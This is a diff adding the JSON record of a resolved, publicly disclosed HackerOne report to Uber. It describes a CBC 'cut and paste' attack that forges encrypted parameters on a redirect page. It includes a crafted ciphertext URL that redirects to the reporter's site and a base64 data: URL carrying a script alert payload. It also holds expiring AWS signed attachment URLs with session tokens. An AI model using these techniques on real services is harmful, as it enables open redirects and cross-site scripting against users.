@@ -1,0 +1,205 @@
+{
+  "id": 126203,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYyMDM=",
+  "url": "https://hackerone.com/reports/126203",
+  "title": "CBC \"cut and paste\" attack may cause Open Redirect(even XSS)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-03-26T17:43:15.898Z",
+  "submitted_at": "2016-03-26T17:43:15.898Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orange",
+    "url": "/orange",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-12T17:20:06.598Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-15T17:34:56.861Z",
+  "team_member_agreed_on_going_public_at": "2016-08-12T17:20:06.516Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, Uber Security Team\n\nI found an vulnerability in Uber URL redirect page.\n\n# Vulnerability\nIn page\n```\nhttp://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa0e40f3acb1e99e66c\n```\n\nparameter \"EQ\" is an encrypted URL and \"Redirect.aspx\" will redirect page to url which is decrypted.\nAfter some trying, it looks like encryted by **CBC mode** and block size is **8**.\n\nAnd I found an URL \n```\nhttps://pages.et.uber.com/hangzhou1year/?uuid=1234\n```\n\nThis URL can encrypted itself. For example\nAccess\n`https://pages.et.uber.com/hangzhou1year/?uuid=1234`\nand view the source you will see\n```\nhttps://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa025d290b1cf9a6e85\n```\nAbove is the encrypted result of string `https://pages.et.uber.com/hangzhou1year/?uuid=1234`\n\n\n# Exploiting\nok, now I can encrypt something by `?uuid=whatever` and decrypt something by `?EQ=whatever`\n\nso I can decrypt all the cipher by `?EQ=whatever` (remember the padding...)\n\nAnd I can create any cipher by **CBC cut and paste attack**\nFor Example, I encrypt `@orange.tw/?` and paste and cipher to bellow URL, when you access URL, you will redirect to orange.tw(my website)\n```\nhttp://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bc9a3bb1c67bf3b0edc8be7c80b4a998d2ce17fd5dd704e741309ec46b0627b0c1924321b894eebbc0128fce2b552959e\n```\n\nI think this vulnerability also can lead to XSS by creating an URL like\n```\ndata:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\n```\nif I have more time doing research ( it's evening in my country now :O )\n\n\n# Attachments\n\n`fake.py` is my Python poc\n`2016-03-26_172607.jpg` decrypt the last block of cipher (%08%08%08%08%08%08%08%08 represented it use PKCS #5 padding)\n",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 81491,
+      "file_name": "fake.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/491/09b8d97653674eb6d3a645d2020d104be5de3855/fake.py?response-content-disposition=attachment%3B%20filename%3D%22fake.py%22%3B%20filename%2A%3DUTF-8%27%27fake.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5ITRTXJB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065500Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDAq%2FqG99wihLKlgCgQYQMQa0KhHVPOco3Tmuyu3afIDgIhAIm%2FjerStMoux21vVLSWQrokkz8dYWF2mFhJqfc6HzRDKrEFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwTPSdKGVdJUBXaUcUqjgWcBCaXLKdNypfcIKUywvO3MFGwQwizhmTWV5m%2FvVaa5hlVD6J9S1ywf3Xn9d%2BXehjMfKRH5LbyBGCLXWu%2B9crOlGX%2F2O7Bx4oF97RA9IViWoDyhgOtZ1p2b%2BGBvSg02QmdpW8%2BvUm9rNtIcxZFh0OitkPgsZrUcat8%2FN%2BVYImuNcKjUnWuQk9loOZM2I8Y8kUjJH5U9gw2mlSenZ3uLGFCHhhExXS05BpI%2BQpsrngBGUPkyk1Zlh67Lr6WkPvT859ZZiMg4bAtN5jd2GlVAhUewocrHbmYx0PlPoAiv2B55cs2kbItIchZJ5Qcpq%2Fc%2Fna6cYSpfj0aFtueRT9I7rhRg1KV6AC8GObDnnQQ0L%2FZRLE012kePYgsEaP2nB5WCHNH2hsc%2FsZfs0TMEZHXmAXfF1c8sTw4Pegi508Yb%2BMqtDmQPa2ZR8jYB5R4xGxMDH9FGrpBFeNRA%2BbOqkvOsxmQxDGkcNWeR9zjTNYwYx5m91DvHfjU1b4lW7ZBo6%2B5GSh917qfUAb%2FO5C0OyQGnn6XUrwjPB3d8x0JEVYhqEb7I6RYUrWjSMaDG3p1HmpBtGO%2FoCd7uWZUl790eTUx5kFdQ6ecYMvtH3wHepm8THevch7glZI7jWVKDXbSC9KZ5WQJ95X%2Fz6r8dk0GQcopDXY9G3s3krOCl1Jxc9xonbEfuu7Ww9%2F%2FZyFp0u4o5UWsFBTtAVELwfsdVWt%2F8h5fBLPAI7d5%2BIwJlaXMiCf8OYDGplD8fWzZcRT0zgBqXvlIQ8PXsxauP9x4K6HdcQM1zxWGWMs9yODFJMGhvtIIXnHJLl3pyKQbeP%2FLU3d0ixRqvkfaH%2FTCyRM%2By40wDvyo8vXnbqf3Fq1eO%2B9KO65RRLcwnNK30gY6sAEgITbtec6ihgU4xST%2Frr8gvjqJyNWjr4izZehOg52FYOLKcWrkdGNTyldZnjKJnXQerR4tlo3ce6FG%2F2SeCkPxqmINt%2BUGgQ6K4js4T8TqyYUAVBZwcbxL44pCgDtNtanYkZqcdYOzMaLucPyqk98Y237jXn5fRAtYz%2FNuW%2BYXEcccYv3tPOoNP5z%2FUuCEJgVpL%2BX%2BLtv%2BcPlOYlh9ZQvc263Q6GZDn8QUEbVEJeM6sw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c224d6ed56f5abbb17f5faf48ade1a971c3175c6f166810e94927b6f357e44d",
+      "file_size": 1692,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 81492,
+      "file_name": "2016-03-26_172607.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/492/61755c114bd5dd8221719dec5279750799ffb245/2016-03-26_172607.jpg?response-content-disposition=attachment%3B%20filename%3D%222016-03-26_172607.jpg%22%3B%20filename%2A%3DUTF-8%27%272016-03-26_172607.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5ITRTXJB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065500Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDAq%2FqG99wihLKlgCgQYQMQa0KhHVPOco3Tmuyu3afIDgIhAIm%2FjerStMoux21vVLSWQrokkz8dYWF2mFhJqfc6HzRDKrEFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwTPSdKGVdJUBXaUcUqjgWcBCaXLKdNypfcIKUywvO3MFGwQwizhmTWV5m%2FvVaa5hlVD6J9S1ywf3Xn9d%2BXehjMfKRH5LbyBGCLXWu%2B9crOlGX%2F2O7Bx4oF97RA9IViWoDyhgOtZ1p2b%2BGBvSg02QmdpW8%2BvUm9rNtIcxZFh0OitkPgsZrUcat8%2FN%2BVYImuNcKjUnWuQk9loOZM2I8Y8kUjJH5U9gw2mlSenZ3uLGFCHhhExXS05BpI%2BQpsrngBGUPkyk1Zlh67Lr6WkPvT859ZZiMg4bAtN5jd2GlVAhUewocrHbmYx0PlPoAiv2B55cs2kbItIchZJ5Qcpq%2Fc%2Fna6cYSpfj0aFtueRT9I7rhRg1KV6AC8GObDnnQQ0L%2FZRLE012kePYgsEaP2nB5WCHNH2hsc%2FsZfs0TMEZHXmAXfF1c8sTw4Pegi508Yb%2BMqtDmQPa2ZR8jYB5R4xGxMDH9FGrpBFeNRA%2BbOqkvOsxmQxDGkcNWeR9zjTNYwYx5m91DvHfjU1b4lW7ZBo6%2B5GSh917qfUAb%2FO5C0OyQGnn6XUrwjPB3d8x0JEVYhqEb7I6RYUrWjSMaDG3p1HmpBtGO%2FoCd7uWZUl790eTUx5kFdQ6ecYMvtH3wHepm8THevch7glZI7jWVKDXbSC9KZ5WQJ95X%2Fz6r8dk0GQcopDXY9G3s3krOCl1Jxc9xonbEfuu7Ww9%2F%2FZyFp0u4o5UWsFBTtAVELwfsdVWt%2F8h5fBLPAI7d5%2BIwJlaXMiCf8OYDGplD8fWzZcRT0zgBqXvlIQ8PXsxauP9x4K6HdcQM1zxWGWMs9yODFJMGhvtIIXnHJLl3pyKQbeP%2FLU3d0ixRqvkfaH%2FTCyRM%2By40wDvyo8vXnbqf3Fq1eO%2B9KO65RRLcwnNK30gY6sAEgITbtec6ihgU4xST%2Frr8gvjqJyNWjr4izZehOg52FYOLKcWrkdGNTyldZnjKJnXQerR4tlo3ce6FG%2F2SeCkPxqmINt%2BUGgQ6K4js4T8TqyYUAVBZwcbxL44pCgDtNtanYkZqcdYOzMaLucPyqk98Y237jXn5fRAtYz%2FNuW%2BYXEcccYv3tPOoNP5z%2FUuCEJgVpL%2BX%2BLtv%2BcPlOYlh9ZQvc263Q6GZDn8QUEbVEJeM6sw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=67f275610c08ebc5b97543a842a93e37f0f6c15a05b27977232240a42e4ce69e",
+      "file_size": 158928,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-08-14T17:34:56.978Z",
+  "allow_singular_disclosure_after": -312297603.3493534,
+  "singular_disclosure_allowed": true,
+  "vote_count": 22,
+  "voters": [
+    "muslimfrompk",
+    "trieulieuf9",
+    "bogdantc",
+    "orange",
+    "spam404",
+    "hackerhero",
+    "yaworsk",
+    "mysterican",
+    "eveeez",
+    "c12316651",
+    "and 12 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "126203",
+  "votes": 22,
+  "latest_disclosable_activity_at": "2016-08-12T17:20:06.682Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:55:00.442521",
+    "source": "https://hackerone.com/reports/126203.json",
+    "report_id": 126203
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYyMDM=",
+    "databaseId": "126203",
+    "title": "CBC \"cut and paste\" attack may cause Open Redirect(even XSS)",
+    "url": "https://hackerone.com/reports/126203",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-08-12T17:20:06.598Z",
+    "created_at": "2016-03-26T17:43:15.898Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzMy",
+      "name": "Cryptographic Issues - Generic",
+      "external_id": "cwe-310"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "orange"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzMxNA==",
+      "handle": "uber",
+      "name": "Uber",
+      "url": "https://hackerone.com/uber",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8zMDgzMA==",
+            "amount": "500.00",
+            "awarded_amount": "500.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-07-29T18:19:11.265Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzEyNjIwMw==",
+    "_id": "126203",
+    "disclosed": true,
+    "votes": 22,
+    "latest_disclosable_activity_at": "2016-08-12T17:20:06.682Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYyMDM=",
+      "databaseId": "126203",
+      "title": "CBC \"cut and paste\" attack may cause Open Redirect(even XSS)",
+      "url": "https://hackerone.com/reports/126203",
+      "disclosed_at": "2016-08-12T17:20:06.598Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzMxNA==",
+      "handle": "uber",
+      "name": "Uber",
+      "url": "https://hackerone.com/uber",
+      "currency": "usd"
+    }
+  }
+}
